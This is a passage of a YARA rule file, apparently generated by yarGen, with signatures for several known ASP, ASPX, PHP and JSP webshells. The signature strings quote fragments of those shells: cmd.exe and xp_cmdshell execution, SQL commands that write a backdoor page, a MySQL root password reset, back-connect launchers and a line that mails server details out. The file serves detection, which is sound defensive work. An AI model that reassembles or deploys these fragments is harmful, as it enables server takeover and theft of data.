      $s20 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule _ {
   meta:
      description = "webshell - file .aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b3303b610b955dfc13d3f554a042661f7249e83a78888377192d0eec6c2e925e"
   strings:
      $s1 = "32\\cmd.exe</asp:TextBox>" fullword ascii
      $s2 = "              db_cmd.ExecuteNonQuery()" fullword ascii
      $s3 = "            <asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\w" ascii
      $s4 = "            <asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\w" ascii
      $s5 = "        myProcessStartInfo.UseShellExecute = False" fullword ascii
      $s6 = "                        recResult = adoConn.Execute(strQuery)" fullword ascii
      $s7 = "                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)" fullword ascii
      $s8 = "        myProcessStartInfo.Arguments = CMDCommand.text" fullword ascii
      $s9 = "                    rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
      $s10 = "                    File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)" fullword ascii
      $s11 = "                    strQuery = \"exec master.dbo.xp_cmdshell '\" & Sqlcmd.Text & \"'\"" fullword ascii
      $s12 = "=\"Login\"></asp:Button>" fullword ascii
      $s13 = "        response.Write(\"<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc\"&\"ript>\")" ascii
      $s14 = "        TEMP = Right(SQLs, Len(SQLS) - Instr(1, SQLs, \"from\", 1) - 3 )" fullword ascii
      $s15 = "<%@ import Namespace=\"System.Data\" %>" fullword ascii
      $s16 = "<%@ import Namespace=\"System.Data.OleDb\" %>" fullword ascii
      $s17 = "<%@ Page Language=\"VB\" ContentType=\"text/html\" validaterequest=\"false\" AspCompat=\"true\" Debug=\"true\" %>" fullword ascii
      $s18 = "            <asp:HyperLink id=\"HyperLink1\" runat=\"server\" Visible=\"True\" Target=\"_blank\" NavigateUrl=\"http://canglangji" ascii
      $s19 = "        Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)" fullword ascii
      $s20 = "            <asp:Label id=\"DB_exe\" runat=\"server\" height=\"37px\" visible=\"False\">Execute SQL :</asp:Label>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      8 of them
}

rule webshell_asp_Rader {
   meta:
      description = "webshell - file Rader.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8009a7f38189b6bdc8e8afca6fc2aa27ab1ca09525e36e3664de8436b78cf439"
   strings:
      $s1 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
      $s2 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
      $s3 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail.com title=\"E-mail G" fullword ascii
      $s4 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
      $s5 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
      $s6 = "// --></style><%#@~^BwAAAA==n" fullword ascii
      $s7 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s8 = "ls+UQMAAA==^#~@%> - www.infilak.tr.cx</title><%#@~^HAEAAA==@#@&l^DP{PI" fullword ascii
      $s9 = "<%@ LANGUAGE = VBScript.Encode %>" fullword ascii
      $s10 = "<noscript><noscript><plaintext><plaintext>" fullword ascii
      $s11 = "body {scrollbar-face-color: #000000; scrollbar-shadow-color: #003333; scrollbar-highlight-color: #FFFFFF; scrollbar-3dlight-colo" ascii
      $s12 = ".boxcontent {" fullword ascii
      $s13 = "A.postlink {" fullword ascii
      $s14 = "r: #003333; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #993300; scrollbar-arrow-color: #CC3300;}" fullword ascii
      $s15 = "@!zm@*Pr9LwCAA==^#~@%><title>I.N.F HACKING CENTER - <%=#@~^CAAAAA==2MWm" fullword ascii
      $s16 = "R&UsbSCVcKD /o@!&l@*'" fullword ascii
      $s17 = "P+XY#@#@&.+kwKxd+ AMkO+,VW9VC.@#@&+U[,kWoT4AAA==^#~@%>" fullword ascii
      $s18 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&W8%_KPnc6a+U,JV2Kr~,EJL3slkW.'rJ~,Wl^/+@#@&G4NC:KKRjn" fullword ascii
      $s19 = "}</style><style><!-- " fullword ascii
      $s20 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: 4px; LETTER-SPACING: 1px; HEIGHT: 27px" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 30KB and
      8 of them
}

rule EgY_SpIdEr_ShElL_V2 {
   meta:
      description = "webshell - file EgY_SpIdEr ShElL V2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
   strings:
      $x1 = "     else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "     if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x3 = "  $_POST['cmd']=\" http://target.com/ini.php?egy=http://shell.txt? add ss ini.php now  make incloude for file ini.php and add eg" ascii
      $x4 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x5 = "     else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "     if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x7 = "'ar_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x8 = "win_shell_execute(\"..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe\");" fullword ascii
      $x9 = "    else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" -" ascii
      $x10 = "    else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" -" ascii
      $x11 = "  $_POST['cmd']=\" http://target.com/ini.php?egy=http://shell.txt? add ss ini.php now  make incloude for file ini.php and add eg" ascii
      $x12 = "     else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params" ascii
      $x13 = "     {@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>" ascii
      $x14 = "     {@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>" ascii
      $x15 = "     else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output." ascii
      $x16 = "     if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cf" ascii
      $x17 = "//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager" fullword ascii
      $x18 = "     if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cf" ascii
      $s19 = "//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)" fullword ascii
      $s20 = "<form target=\"_blank\" action=\"http://www.md5encryption.com/?mod=decrypt\" method=POST>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 900KB and
      1 of ($x*) and all of them
}

rule zacosmall {
   meta:
      description = "webshell - file zacosmall.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "addb8577594a550a3c7853251ea227df7af8c8a0878d3461020226bd3e1dd9ba"
   strings:
      $s1 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c8" ascii
      $s2 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}_${table_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n" ascii
      $s3 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s4 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s5 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s7 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s8 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s9 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s10 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s11 = "$temp_file=isset($_POST['temp_file'])?'on':'nn';" fullword ascii
      $s12 = "$cmd=!empty($_POST['cmd'])?magic_q($_POST['cmd']):'';" fullword ascii
      $s13 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s14 = "echo $dump_file;" fullword ascii
      $s15 = "$dump_file=\"#ZaCo MySQL Dumper\\n#db $db from $host\\n\";" fullword ascii
      $s16 = "hn.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii
      $s17 = "$action=isset($_POST['action'])?$_POST['action']:'cmd';" fullword ascii
      $s18 = "$dump_file.=$rows2[$k]==''?'null,':'\\''.addslashes($rows2[$k]).'\\',';" fullword ascii
      $s19 = "$dump_file.='`'.$rows2[0].'` '.$rows2[1].($rows2[2]=='NO'&&$rows2[4]!='NULL'?' NOT NULL DEFAULT \\''.$rows2[4].'\\'':' DEFAULT N" ascii
      $s20 = "$dump_file.='insert into `'.$rows[0].'` values (';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule webshell_asp_ {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1816a6e4d41eab4b4a357b94931d238bc089c46d9ec7ae43668b4772a1226e5c"
   strings:
      $s1 = "fso.GetFile(objFile.Name).attributes=ShuXing" fullword ascii
      $s2 = "<form method=post>" fullword ascii
      $s3 = "Set objFolder=FSO.GetFolder(Path)" fullword ascii
      $s4 = "Response.WRItE\"" fullword ascii
      $s5 = "Response.WRItE\"<br>" fullword ascii
      $s6 = "<input type=submit value=" fullword ascii
      $s7 = " \"&path&\" " fullword ascii
      $s8 = "<option value=''>" fullword ascii
      $s9 = "dim path,FileName,NewTime,ShuXing" fullword ascii
      $s10 = "<select onChange='this.form.shuxing.value=this.value;'>" fullword ascii
      $s11 = "<input name='path' value='<%=server.MAppATH(\"/\")%>\\' size='40'> " fullword ascii
      $s12 = "<input name=filename value='<%=filename%>' size='20'> " fullword ascii
      $s13 = "<option value='33'>" fullword ascii
      $s14 = "if filename=\"\" then '" fullword ascii
      $s15 = "<option value='35'>" fullword ascii
      $s16 = "<option value='34'>" fullword ascii
      $s17 = "set filename=request.Form(\"filename\")" fullword ascii
      $s18 = "<input style=\"display:none\" name=shuxing value='0' size='1'>" fullword ascii
      $s19 = "set newTime=request.Form(\"newTime\")" fullword ascii
      $s20 = "if newTime<>\"\" then '" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 5KB and
      8 of them
}

rule webshell_jsp_action {
   meta:
      description = "webshell - file action.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2d89359c199d77c6bc80758793fdcdc7baf14eea629222cf13d8ad775fce6452"
   strings:
      $s1 = "Connection conn= DriverManager.getConnection(url,user,password);" fullword ascii
      $s2 = "ResultSet rs=stmt.executeQuery(sql);" fullword ascii
      $s3 = "<meta http-equiv=Content-Type content=\"text/html; charset=gb2312\">" fullword ascii
      $s4 = "String password=\"oracle_password\";" fullword ascii
      $s5 = "<td><%=rs.getString(5)%></td>" fullword ascii
      $s6 = "<td><%=rs.getString(6)%></td>" fullword ascii
      $s7 = "<td><%=rs.getString(10)%></td>" fullword ascii
      $s8 = "<td><%=rs.getString(8)%></td>" fullword ascii
      $s9 = "<td><%=rs.getString(1)%></td>" fullword ascii
      $s10 = "<td><%=rs.getString(7)%></td>" fullword ascii
      $s11 = "<td><%=rs.getString(2)%></td>" fullword ascii
      $s12 = "<td><%=rs.getString(9)%></td>" fullword ascii
      $s13 = "<td><%=rs.getString(3)%></td>" fullword ascii
      $s14 = "<td><%=rs.getString(4)%></td>" fullword ascii
      $s15 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii
      $s16 = "<%@ page import=\"java.lang.*\"%>" fullword ascii
      $s17 = "<%@ page import=\"java.util.*\"%>" fullword ascii
      $s18 = "String user=\"oracle_admin\";" fullword ascii
      $s19 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
      $s20 = "<title>xxx</title>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule elmaliseker {
   meta:
      description = "webshell - file elmaliseker.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "aba1440e6fa797116ec2d0f0dda9278eae32ee2155ee0c5ae41dc4e02337bfbd"
   strings:
      $x1 = "const Shell=\"cmd.exe\" ' shell mac dinh" fullword ascii
      $s2 = "Response.Write \" <td><a href=\"\"javascript:Command('Download',\"\" & item.Name & \"\")\"\"\"" fullword ascii
      $s3 = "set rS=adoCon.Execute(szSQL, intAffected)" fullword ascii
      $s4 = "if (Request.Form(\"command\")=\"Login\") then" fullword ascii
      $s5 = "<td colspan=2><input type=submit name=command value=Login></td>" fullword ascii
      $s6 = "call oScript.Run(szShell & \" /c \" & szCmd)" fullword ascii
      $s7 = "call oScript.Run(szShell & \" /c \" & szCmd & \" > \" & szTmpFile, 0, true)" fullword ascii
      $s8 = "Response.Write \" <td><a href=\"\"javascript:Command('OpenFolder',\"\" & item.Name & \"\")\"\"\" " fullword ascii
      $s9 = "fmobj.command.value=cmd;" fullword ascii
      $s10 = "frmFile.command.value = cmd;" fullword ascii
      $s11 = "frmFile.command.value = cmd" fullword ascii
      $s12 = "itemPath=addslash(targetPath) & itemName" fullword ascii
      $s13 = "itemPath=addslash(targetPath) & newName" fullword ascii
      $s14 = ".CompressedSize = GetNumber(llngOffset + 19, 4)" fullword ascii
      $s15 = ".CompressionMethod = GetNumber(llngOffset + 9, 2)" fullword ascii
      $s16 = "<form name=frmLogin method=post action=\"<%=gURL%>\">" fullword ascii
      $s17 = "<b>U</b>ser: \\\\<%=oScriptNet.ComputerName%>\\\\<%=oScriptNet.UserName%>" fullword ascii
      $s18 = "<script>frmCMD.cmd.focus()</script>" fullword ascii
      $s19 = "<td><a href=\"javascript:Command('LevelRoot')\" title=\"Up Root Level\">\\</a></td>" fullword ascii
      $s20 = "' Email : forever5pi@yahoo.com" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_G5 {
   meta:
      description = "webshell - file G5.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
   strings:
      $x1 = "{echo \"<form name=\\\"site\\\" action=\\\"\".$php.\"\\\"method=\\\"post\\\"><select size=\\\"1\\\" name=\\\"alI\\\" title=\\\"F" ascii
      $x2 = "if(wdll_chf()) wdll_cmdf('start /b C:\\AppServ\\MySQL\\bin\\mysqld-nt.exe --skip-grant-tables --user=root');" fullword ascii
      $x3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</option><option value='1'>known vulnerability (i.e." ascii
      $x4 = "if(wdll_chf()) wdll_cmdf(\"C:\\AppServ\\MySQL\\bin\\mysql -e \\\"update mysql.user set PASSWORD=PASSWORD('piaster') where user =" ascii
      $x5 = "if(wdll_chf()) wdll_cmdf(\"C:\\AppServ\\MySQL\\bin\\mysql -e \\\"update mysql.user set PASSWORD=PASSWORD('piaster') where user =" ascii
      $x6 = "// G5 (W.DLL) v2.0 8/8/2010 - last edit 20/9/2011) Lines after gzip = 1393  size = 86KB Coded by Piaster (wadelamin) " fullword ascii
      $x7 = "<font size=\\\"2\\\" color =\\\"ffffff\\\"><b>w.dll@live.com 2011 | <a target=_blank href='http://piaster.blogspot.com'>Site</a>" ascii
      $x8 = "<font size=\\\"2\\\" color =\\\"ffffff\\\"><b>w.dll@live.com 2011 | <a target=_blank href='http://piaster.blogspot.com'>Site</a>" ascii
      $x9 = "if(wdll_chf()) {wdll_cmdf(\"perl wbg.pl $bo\"); echo \"<br>connected to $bo\";echo \"<script type='text/javascript'>alert('conne" ascii
      $x10 = "if(wdll_chf()) {wdll_cmdf(\"perl bpg.pl $ip $bo\"); echo \"<br>connected to $ip $bo\";echo \"<script type='text/javascript'>aler" ascii
      $x11 = "if(wdll_chf()) {wdll_cmdf(\"perl lbg.pl $bo\");echo \"<br>connected to $bo \";echo \"<script type='text/javascript'>alert('conne" ascii
      $x12 = "echo '<br> Please wait ................................... Goodluck ...Win phpMyAdmin Hacked :: <br>USER: root & PASSWORD: piast" ascii
      $x13 = "nnected to $ip $bo')</script>\";}else die(\"<br>I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode \");}}" ascii
      $x14 = "to $bo')</script>\";} else die(\"<br>I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode $bo\");}" fullword ascii
      $x15 = "if(wdll_chf()) {wdll_cmdf(\"C:\\AppServ\\MySQL\\bin\\mysqladmin -u root shutdown\"); " fullword ascii
      $s16 = "{$res = '';if (!empty($cmdq)){if(function_exists('exec')){@exec($cmdq,$res);$res = @join(\"\\n\",$res);}elseif(function_exists('" ascii
      $s17 = "body,table { font-family:verdana;font-size:11px;color:silver;background-color:$col4; }table { width:100%; }table,td { border:1px" ascii
      $s18 = "ll_exec')){$res = @shell_exec($cmdq);}elseif(function_exists('system')){@ob_start();@system($cmdq);$res = @ob_get_contents();@ob" ascii
      $s19 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$USR || $_SERVER['PHP_AUTH_PW']!==$PWD){ob_end_clean();head" ascii
      $s20 = "er('WWW-Authenticate: Basic realm=\"Piaster\"');header('HTTP/1.0 401 Unauthorized');exit(\"<b><a href=http://www.w-dll.com>Piast" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule KAdot_Universal_Shell_v0_1_6 {
   meta:
      description = "webshell - file KAdot Universal Shell v0.1.6.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "06d8c97448db0b9c7790e0d94fcb8db79162ea23ac65f1f74e687f3186017f73"
   strings:
      $s1 = "$login = \"admin\";" fullword ascii
      $s2 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass || empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_US" ascii
      $s3 = "//PHP Eval Code execution" fullword ascii
      $s4 = "header('WWW-Authenticate: Basic realm=\"KA_uShell\"');" fullword ascii
      $s5 = "passthru($_POST['c']);" fullword ascii
      $s6 = "if (empty($_POST['wser'])) {$wser = \"whois.ripe.net\";} else $wser = $_POST['wser'];" fullword ascii
      $s7 = "if (isset($_POST['wq']) && $_POST['wq']<>\"\") {" fullword ascii
      $s8 = "ER']<>$login)" fullword ascii
      $s9 = "if (!empty($_POST['tot']) && !empty($_POST['tac'])) {" fullword ascii
      $s10 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword ascii
      $s11 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword ascii
      $s12 = ":<b>\" .base64_decode($_POST['tot']). \"</b>\";" fullword ascii
      $s13 = "// Shell" fullword ascii
      $s14 = "while(!feof($fp)){echo fgets($fp, 4000);}" fullword ascii
      $s15 = "|<a href=$self?ac=shell>Shell</a>|" fullword ascii
      $s16 = "else {$ac = \"shell\";}" fullword ascii
      $s17 = "if (isset($_POST['ephp'])){" fullword ascii
      $s18 = "<title>KA_uShell 0.1.6</title>" fullword ascii
      $s19 = "if (copy($_FILES['file']['tmp_name'], $uploadfile)) {" fullword ascii
      $s20 = ":<b>\" .base64_encode($_POST['tot']). \"</b>\";" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 10KB and
      8 of them
}

rule Antichat_Shell_v1_3 {
   meta:
      description = "webshell - file Antichat Shell v1.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "501dd045c1afc942500c331f777696f9ad5a9a3844d1ae6a15878e56aa0d3e77"
   strings:
      $x1 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $x2 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $s3 = "if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';" fullword ascii
      $s4 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s5 = "echo '<center><table><form method=\"POST\"><tr><td>Login:</td><td><input type=\"text\" name=\"login\" value=\"\"></td></tr><tr><" ascii
      $s6 = "//downloader" fullword ascii
      $s7 = "//end downloader" fullword ascii
      $s8 = "<textarea readonly rows=\\\"15\\\" cols=\\\"150\\\">\".@htmlspecialchars(shell($_POST['command'])).\"</textarea><br>" fullword ascii
      $s9 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87" ascii
      $s10 = "$login='smowu';" fullword ascii
      $s11 = "function shell($cmd){" fullword ascii
      $s12 = "header('Content-Disposition: attachment; filename=\"'.$file.'\"');" fullword ascii
      $s13 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";}" fullword ascii
      $s14 = "$sd98 = \"john.barker446@gmail.com\";" fullword ascii
      $s15 = "header('Content-Length:'.filesize($file).'');" fullword ascii
      $s16 = "_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32" ascii
      $s17 = "if($_POST['file']!=\"\"){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']=\"\";}" fullword ascii
      $s18 = "if($_POST['dir']!=\"\")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];" fullword ascii
      $s19 = "  $contents = fread($le, filesize($file));" fullword ascii
      $s20 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='shell'; document.reqs.submit();\">| Shell </a></td>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_11 {
   meta:
      description = "webshell - file 11.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
   strings:
      $x1 = "        string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select o" ascii
      $x2 = " @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_mak" ascii
      $x3 = "            <asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
      $x4 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $x5 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
      $s6 = "rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a> -> <a href=\"http://www.rootkit.net.cn/index.aspx\" target=\"_blank\">" ascii
      $s7 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $s8 = "_OACreate','odsole70.dll')\\\">Add sp_oacreate<option value=\\\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')" ascii
      $s9 = "p_cmdshell 'net user'\\\">XP_cmdshell exec<option value=\\\"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMe" ascii
      $s10 = "                    CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System3" ascii
      $s11 = "            <strong>Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></st" ascii
      $s12 = "            <asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2008 Bin -> <a href=\"http" ascii
      $s13 = "            <strong>Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></st" ascii
      $s14 = "change=if(this.value!='')Command('changedata',this);><option>SQL Server Exec<option value=\\\"Use master dbcc addextendedproc ('" ascii
      $s15 = "<i>&lt;dir&gt;</i></b></td><td>\" + Directory.GetLastWriteTime(Bin_path + \"/\" + Bin_folder.Name) + \"</td><td><a href=javascri" ascii
      $s16 = "avascript:Command('deldir','\" + foldername + \"');>Del</a></td>\";" fullword ascii
      $s17 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
      $s18 = "nd('rename','\" + filename + \"');>Ren</a>|<a href=javascript:Command('down','\" + filename + \"');>Down</a>|<a href=javascript:" ascii
      $s19 = "ommand('renamedir','\" + foldername + \"');>Ren</a>|<a href=javascript:Command('showatt','\" + foldername + \"/');>Att</a>|<a hr" ascii
      $s20 = "path + \"/\" + Bin_file.Name) + \"</td><td><a href=javascript:Command('edit','\" + filename + \"');>Edit</a>|<a href=javascript:" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_aspxspy {
   meta:
      description = "webshell - file aspxspy.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fca2eae39f4009790408335b71d773b02890a08b581c6ff6bb32def585020abf"
   strings:
      $x1 = "        string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select o" ascii
      $x2 = "AMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=" ascii
      $x3 = "            <asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
      $x4 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $x5 = "kewebtask @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' " ascii
      $s6 = "rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a> -> <a href=\"http://www.rootkit.net.cn/index.aspx\" target=\"_blank\">" ascii
      $s7 = "r.dbo.xp_cmdshell 'net user'\\\">XP_cmdshell exec<option value=\\\"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec " ascii
